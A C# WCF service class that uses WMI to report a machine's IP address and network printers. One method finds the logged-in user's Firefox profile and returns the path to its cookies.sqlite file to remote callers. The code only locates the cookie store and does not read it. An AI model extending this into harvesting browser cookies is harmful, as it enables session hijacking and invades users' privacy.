using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;

namespace MyWCF_WMI
{
    // NOTE: You can use the "Rename" command on the "Refactor" menu to change the class name "Service1" in code, svc and config file together.
    // NOTE: In order to launch WCF Test Client for testing this service, please select Service1.svc or Service1.svc.cs at the Solution Explorer and start debugging.
    public class Service1 : IService1
    {
        public string GetIp()
        {
            string str = string.Empty;
            try
            {
                ManagementClass wmi = new ManagementClass("Win32_NetworkAdapterConfiguration");
                List<string> allIPs = new List<string>();
                ManagementObjectCollection allConfigs = wmi.GetInstances();
                foreach (ManagementObject configuration in allConfigs)
                {
                    if (configuration["IPAddress"] != null)
                    {
                        if (configuration["IPAddress"] is Array)
                        {
                            string[] addresses = (string[])configuration["IPAddress"];
                            allIPs.AddRange(addresses);
                        }
                        else
                        {
                            allIPs.Add(configuration["IPAddress"].ToString());
                        }
                    }
                }
                str = allIPs[0].ToString();
                return str;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public string GetMachine_Directoy()
        {
            string str = string.Empty;
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem");
                ManagementObjectCollection collection = searcher.Get();
                string username = (string)collection.Cast<ManagementBaseObject>().First()["UserName"];
                string name = username.Substring(username.LastIndexOf("\\") + 1);
                string ComputerName = username.Substring(0, username.LastIndexOf("\\"));
                List<string> filesCokkie = new List<string>();

                str = "Computer Name: " + ComputerName + "|" + "User Name: " + username;

                ManagementScope Scope = new ManagementScope(String.Format("\\\\{0}\\root\\CIMV2", ComputerName), null);

                Scope.Connect();
                string Drive = "C:";
                string files = string.Empty;

                string Path = "\\\\Users\\\\" + name + "\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\";
                ObjectQuery Query = new ObjectQuery(string.Format("SELECT * FROM Win32_Directory Where Drive='{0}' AND Path='{1}' ", Drive, Path));

                ManagementObjectSearcher Searcher_ = new ManagementObjectSearcher(Scope, Query);

                foreach (ManagementObject WmiObject in Searcher_.Get())
                {
                    filesCokkie.Add(WmiObject["Name"].ToString() + @"\cookies.sqlite");
                }

                str += str = "|" + filesCokkie[0].ToString();
              
            }
            catch (Exception)
            {
                str = "error";
            }
            return str;
        }

        public IList<ManagementBaseObject> GetPrinters()
        {
            var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Printer");
            var results = searcher.Get();

            IList<ManagementBaseObject> printers = new List<ManagementBaseObject>();

            foreach (var printer in results)
            {
                if ((bool)printer["Network"])
                {
                    printers.Add(printer);
                }
            }
            return printers;
        }
    }
}
